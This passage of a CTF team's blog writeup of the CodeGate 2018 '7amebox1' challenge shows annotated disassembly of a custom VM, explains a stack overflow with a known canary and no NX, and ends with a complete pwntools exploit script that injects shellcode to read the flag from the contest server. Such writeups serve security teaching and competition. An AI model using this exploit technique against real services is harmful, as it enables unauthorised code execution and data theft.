ROM:0012                 x4_movrX r5, bp
ROM:0014                 x11_subX r5, $3         ; r5 = bp - 3
ROM:0019                 x4_movrX r6, $12345     ; r6 = 0x12345
ROM:001E                 x2_movtomr r6, [r5]     ; [bp-3] = 0x12345
ROM:0020                 x4_movrX r0, $CD        ; r0 = 0xcd
ROM:0025                 x30_call [pc], $66      ; call 0x90 func1
ROM:002A                 x4_movrX r1, $42
ROM:002F                 x4_movrX r5, bp
ROM:0031                 x11_subX r5, $3C
ROM:0036                 x4_movrX r0, r5
ROM:0038                 x30_call [pc], $23      ; call 0x60 func3
ROM:003D                 x4_movrX r0, $D3
ROM:0042                 x30_call [pc], $49      ; call 0x90 func1
ROM:0047                 x4_movrX r5, bp
ROM:0049                 x11_subX r5, $3
ROM:004E                 x0_lea  r6, [r5]
ROM:0050
ROM:0050 loc_50:                                 ; canary check
ROM:0050                 x23_cmp r6, $12345
ROM:0055                 x28_jnz [pc], $1FFFAB
ROM:005A                 x4_movrX sp, bp
ROM:005C                 x7_popr bp
ROM:005E                 x7_popr pc
ROM:0060                 x4_movrX r3, r1         ; func func3 -- print str
ROM:0062                 x4_movrX r2, r0
ROM:0064                 x4_movrX r1, 0
ROM:0069                 x4_movrX r0, $3
ROM:006E                 x8_syscall
ROM:0070                 x7_popr pc              ; func3 end
ROM:0072                 x6_pushX r1
ROM:0074                 x6_pushX r2
ROM:0076                 x6_pushX r3
ROM:0078                 x4_movrX r3, r1         ; func func4 -- read
ROM:007A                 x4_movrX r2, r0
ROM:007C                 x4_movrX r1, 1
ROM:0081                 x4_movrX r0, $2
ROM:0086                 x8_syscall
ROM:0088                 x7_popr r3
ROM:008A                 x7_popr r2
ROM:008C                 x7_popr r1
ROM:008E                 x7_popr pc
ROM:0090                 x6_pushX r0             ; func func1
ROM:0092                 x6_pushX r1
ROM:0094                 x4_movrX r1, r0         ; r1 = 0xcd
ROM:0096                 x30_call [pc], $D       ; call 0xa8 func2
ROM:009B                 x5_swap r0, r1
ROM:009D                 x30_call [pc], $1FFFD0  ; back to 0x72
ROM:00A2                 x7_popr r1
ROM:00A4                 x7_popr r0
ROM:00A6                 x7_popr pc              ; func1 end
ROM:00A8                 x6_pushX r1             ; func func2 -- strlen
ROM:00AA                 x6_pushX r2
ROM:00AC                 x21_xor r1, r1          ; r1 = 0
ROM:00AE                 x21_xor r2, r2          ; r2 = 0
ROM:00B0                 x1_leab r2, r0          ; r2 = [r0]
ROM:00B2                 x24_cmpb r2, 0
ROM:00B7                 x27_jz  [pc], $9
ROM:00BC                 x17_inc r0
ROM:00BE                 x17_inc r1
ROM:00C0                 x29_jmp [pc], $1FFFEB   ; back to 0xb0
ROM:00C5                 x4_movrX r0, r1         ; r0 = r1
ROM:00C7                 x7_popr r2
ROM:00C9                 x7_popr r1
ROM:00CB                 x7_popr pc              ; func2 end
ROM:00CB ; ---------------------------------------------------------------------------
ROM:00CD aName           .ascii &quot;name&gt;&quot;,0
ROM:00D3 aBye            .ascii &quot;bye&quot;,$A,0
ROM:00D3 ; end of 'ROM'
ROM:00D3
</code></pre>

<h2 id="vulnerability-and-exploit">Vulnerability and Exploit</h2>

<p>The vulnerability is obvious, there is a stack overflow. But by dumping the values, we know that we can only overwrite the return address and do not have the ability to perform the ROP part. Fortunately, the <code>NX</code> is actually off in this challenge. So, we can jump directly to the garbage part of our payload, and put a shellcode there to perform the ability to execute arbitrary code.</p>

<p>Since there is no ASLR in the virtual machine, shellcode addresses can be directly hard coded. By reading the virtual machine, we know there is a syscall to open arbitrary file. So, we just need to open the <code>flag</code> file, then read it somewhere, and write it out to stdout. All this can be done using the simulated syscall. Write the shellcode, perform the stack overflow, and we are done.</p>

<h2 id="final-exploit">Final Exploit</h2>

<pre><code>import sys
from pwn import *
from hashlib import sha1

context(log_level='debug')

def pack_num(num):
    binary = bin(num)[2:].rjust(21, '0')
    lists = []
    for i in range(3):
        lists.append(chr(int(binary[:7], 2)))
        binary = binary[7:]
    return lists[-1] + lists[0] + lists[1]

p = remote('13.124.182.123', 8888)

def make_pay():
    payload = 'x' * (0xe0-0xdd)
    #payload = ''
    payload += '\x12\x00\x01' # 0xa1 &lt;- shellcode
    payload += '\x00\x00\x12'
    payload += '\x10R='
    payload += '?\x20\x00' # syscall, open
    payload += '\x14\x01\x54'
    payload += '\x00\x12\x20'
    payload += '\x7f\x00\x01' # buf = 0xff
    payload += '\x12\x10\x02'
    payload += '\x00\x00\x12'
    payload += '\x00\03\x00'
    payload += '\x00\x20\x00' # syscall, read
    payload += '\x54\x11\x54'
    payload += '\x11\x12\x00'
    payload += '\x02\x00\x00'
    payload += '\x44\x11\x20'
    payload += '\x00aa'
    payload += 'afl' # 0xf5fd1, flag 0xf5fd2
    payload += 'ag\x00' # 0xf5fd4
    payload += pack_num(0x12345) # canary, 0xf5fd7
    payload += pack_num(0x54321) # bp, 0xf5fda
    payload += pack_num(0xf5fa1) # dd
    return payload

def pow(prefix, pay):
    i = 0
    while i &lt;= 1000000000:
        answer = (prefix + str(i)).ljust(0xe0-0xdd, 'x') + pay
        if sha1(answer).hexdigest().endswith('000000'):
            return answer
        i += 1
    return None

p.recvuntil('prefix : ')
prefix = p.recvline()[:-1]
print(prefix)
answer = pow(prefix, make_pay())
p.sendline(answer)
p.recvuntil('&gt;')
p.sendline(make_pay())
p.interactive()
</code></pre>
              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">TAGGED IN</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://Team-Eur3kA.github.io/tags/codegate/">codegate</a>

  <a class="tag tag--primary tag--small" href="https://Team-Eur3kA.github.io/tags/codegate-2018/">codegate-2018</a>

  <a class="tag tag--primary tag--small" href="https://Team-Eur3kA.github.io/tags/writeup/">writeup</a>

                  </div>
                
              
            
            
  <div class="post-actions-wrap">
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
                <a class="post-action-btn btn btn--disabled">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/02/welcome-to-team-eur3ka-site/" data-tooltip="Welcome to Team Eur3kA site">
              
                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
              <i class="fa fa-google-plus"></i>
            </a>
          </li>
        
      
      
        <li class="post-action">
          <a class="post-action-btn btn btn--default" href="#disqus_thread">
            <i class="fa fa-comment-o"></i>
          </a>
        </li>
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  </div>


            
              
                <div id="disqus_thread">
  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
              
            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2018 Team-Eur3kA. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
        
  <div class="post-actions-wrap">
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
                <a class="post-action-btn btn btn--disabled">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/02/welcome-to-team-eur3ka-site/" data-tooltip="Welcome to Team Eur3kA site">
              
                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
              <i class="fa fa-google-plus"></i>
            </a>
          </li>
        
      
      
        <li class="post-action">
          <a class="post-action-btn btn btn--default" href="#disqus_thread">
            <i class="fa fa-comment-o"></i>
          </a>
        </li>
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  </div>


      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
  <i id="btn-close-shareoptions" class="fa fa-close"></i>
  <ul class="share-options">
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2FTeam-Eur3kA.github.io%2F2018%2F02%2Fcodegate-2018-7amebox1-writeup%2F">
          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2FTeam-Eur3kA.github.io%2F2018%2F02%2Fcodegate-2018-7amebox1-writeup%2F">
          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2FTeam-Eur3kA.github.io%2F2018%2F02%2Fcodegate-2018-7amebox1-writeup%2F">
          <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
        </a>
      </li>
    
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
    
    <h4 id="about-card-name">Team-Eur3kA</h4>
    
      <div id="about-card-bio">CTF Security Team Eur3kA deriving from former united team FFF-PKyou which consists of members from multiple united team FFF and Peking University team PKyou</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Security Team
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        China
      </div>
    
  </div>
</div>

    <div id="algolia-search-modal" class="modal-container">
  <div class="modal">
    <div class="modal-header">
      <span class="close-button"><i class="fa fa-close"></i></span>
      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
        <span class="searchby-algolia-text text-color-light text-small">by</span>
        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
      </a>
      <i class="search-icon fa fa-search"></i>
      <form id="algolia-search-form">
        <input type="text" id="algolia-search-input" name="search"
          class="form-control input--large search-input" placeholder="Search" />
      </form>
    </div>
    <div class="modal-body">
      <div class="no-result text-color-light text-center">no post found</div>
      <div class="results">
        
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
                <h3 class="media-heading">CodeGate 2018 7amebox1 Writeup</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Feb 2, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/02/welcome-to-team-eur3ka-site/">
                <h3 class="media-heading">Welcome to Team Eur3kA site</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Feb 2, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Welcome a lot to visit Team Eur3kA offitial site.
</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/1/01/">
                <h3 class="media-heading"></h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jan 1, 0001
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather">codegate 2018 Web writeup Simple CMS Reference: write up from 0ops
This challenge is a sql injection challenge. In this challenge, we can get the source code of the CMS. First we can se that there is a waf for the whole cms:
waf.php
&lt;?php if(!defined('simple_cms')) exit(); $method = $_SERVER['REQUEST_METHOD']; if($method !== 'GET' &amp;&amp; $method !== 'POST'){ exit('are you hacker?'); } $filter_str = array('or', 'and', 'information', 'schema', 'procedure', 'analyse', 'order', 'by', 'group', 'into'); function escape_str($array) { if(is_array($array)) { foreach($array as $key =&gt; $value) { if(is_array($value)) { $array[$key] = escape_str($value); } else { $array[$key] = filter($value); } } } else { $array = filter($array); } return $array; } function filter($str){ global $filter_str; foreach ($filter_str as $value) { if(stripos($str, $value) !</div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
      </div>
    </div>
    <div class="modal-footer">
      <p class="results-count text-medium"
         data-message-zero="no post found"
         data-message-one="1 post found"
         data-message-other="{n} posts found">
         3 posts found
      </p>
    </div>
  </div>
</div>
    
  
    
    <div id="cover" style="background-image:url('https://Team-Eur3kA.github.io/images/cover.jpg');"></div>
  


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>


<script src="https://Team-Eur3kA.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>



<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight > code, pre > code').each(function(i, block) {
    if (!$(this).hasClass('codeblock')) {
      $(this).addClass('codeblock');
    }
    hljs.highlightBlock(block);
  });
});
</script>


  
    
      <script>
        var disqus_config = function () {
          this.page.url = 'https:\/\/Team-Eur3kA.github.io\/2018\/02\/codegate-2018-7amebox1-writeup\/';
          
            this.page.identifier = '\/2018\/02\/codegate-2018-7amebox1-writeup\/'
          
        };
        (function() {
          
          
          if (window.location.hostname == "localhost") {
            return;
          }
          var d = document, s = d.createElement('script');
          var disqus_shortname = 'hugo-tranquilpeak-theme';
          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    
  



    
  </body>
</html>

